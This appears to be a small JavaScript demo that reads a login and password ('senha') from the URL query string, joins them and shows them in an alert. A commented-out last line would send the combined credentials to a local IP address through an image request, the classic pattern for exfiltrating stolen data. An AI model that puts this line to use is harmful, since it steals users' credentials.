var url   = window.location.search.replace("?", "");
var items = url.split("&");
var array = {
	'login' : items[0],
	'senha' : items[1]
}

retorno = array.senha + array.login;

alert(retorno);




//new Image().src = "http://192.168.0.123/?=" + retorno